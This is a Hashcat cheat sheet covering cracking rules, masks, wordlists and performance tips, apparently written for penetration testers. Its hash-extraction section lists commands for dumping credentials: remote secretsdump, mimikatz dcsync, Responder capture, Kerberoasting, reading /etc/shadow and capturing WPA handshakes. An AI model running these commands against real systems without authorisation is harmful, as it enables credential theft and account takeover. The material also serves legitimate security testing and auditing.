# Hashcat — Rules, Masks, Wordlists, Hash Extraction

## Rule Files

| Rule File | Location | Notes |
|-----------|----------|-------|
| `best64.rule` | `/usr/share/hashcat/rules/` | 64 common transformations; good default |
| `dive.rule` | `/usr/share/hashcat/rules/` | ~100k rules; thorough, slow |
| `rockyou-30000.rule` | `/usr/share/hashcat/rules/` | Derived from rockyou patterns |
| `OneRuleToRuleThemAll` | [NotSoSecure GitHub](https://github.com/NotSoSecure/password_cracking_rules) | ~52k rules; very effective for AD |
| `d3adhob0.rule` | community | Aggressive mangling |
| `nsabeast.rule` | community | Appends years, seasons, numbers |

### Combine Rules (additive, each applied independently)

```bash
hashcat -a 0 -m 1000 hashes.txt wordlist.txt -r best64.rule -r dive.rule
```

## Mask Cookbook

| Pattern | Description | Example match |
|---------|-------------|---------------|
| `?u?l?l?l?l?d?d?d` | 8-char: Cap + 4 lower + 3 digits | `Admin123` |
| `?u?l?l?l?l?l?d?d` | 8-char: Cap + 5 lower + 2 digits | `Autumn24` |
| `?l?l?l?l?l?l?l?l` | 8 lowercase | `password` |
| `?u?l?l?l?l?l?l?d?s` | 9-char corporate | `Welcome1!` |
| `?d?d?d?d?d?d?d?d` | 8 digits (PIN/phone) | `19821234` |

### Custom Charset

```bash
# ?1 = uppercase + digits only
hashcat -a 3 -m 1000 hashes.txt -1 ?u?d ?1?1?1?1?1?1?1?1
```

### Increment (auto-grow mask length)

```bash
hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a?a?a --increment --increment-min 6
```

## Wordlist Recommendations

| Wordlist | Size | Best for |
|----------|------|----------|
| `rockyou.txt` | 14M | General starting point |
| SecLists `Passwords/Leaked-Databases/` | varies | Leaked DB hashes |
| `weakpass_3a` | ~8B | Large-scale offline cracking |
| `hashesorg2019` | ~1.5B | Real-world passwords |
| `Probable-Wordlists` | varies | Probable passwords corpus |

Generate targeted wordlists:

```bash
# From website content
cewl https://target.com -w custom.txt

# CUPP (user profile)
cupp -i

# Crunch (pattern-based)
crunch 8 8 -t Admin@@@ -o custom.txt
```

## Hash Extraction Commands

### Windows — NTLM

```bash
# impacket secretsdump (remote)
secretsdump.py domain/user:pass@<target-ip>

# impacket secretsdump (local SAM + SYSTEM hive)
secretsdump.py -sam SAM -system SYSTEM LOCAL

# mimikatz (interactive)
lsadump::sam
lsadump::dcsync /domain:corp.local /all /csv
```

### Windows — Net-NTLMv2 (Responder capture)

```bash
responder -I eth0 -wrf
# Hash appears in Responder/logs/
```

### Kerberoasting / AS-REP

```bash
# Kerberoasting (impacket)
GetUserSPNs.py corp.local/user:pass -dc-ip <dc> -request -outputfile kerberoast.txt

# AS-REP roasting
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip <dc> -format hashcat
```

### Linux — /etc/shadow

```bash
unshadow /etc/passwd /etc/shadow > combined.txt
hashcat -a 0 -m 1800 combined.txt rockyou.txt   # SHA512crypt
hashcat -a 0 -m 500  combined.txt rockyou.txt   # MD5crypt
```

### WPA/WPA2

```bash
# Capture with hcxdumptool
hcxdumptool -i wlan0 -o capture.pcapng --active_beacon

# Convert to hashcat format
hcxpcapngtool -o hashes.hc22000 capture.pcapng

hashcat -a 0 -m 22000 hashes.hc22000 rockyou.txt
```

## Performance Tips

- `-O` (optimized kernels): fastest, caps password length at 31 chars — safe for most corporate hashes
- `-w 3`: high workload; `-w 4` (insane) for dedicated rigs only
- `--self-test-disable`: skip benchmark on startup
- Use NVMe SSD for wordlist I/O when wordlist > RAM
- Cloud: AWS p3.8xlarge (4× V100) or vast.ai for short burst cracking
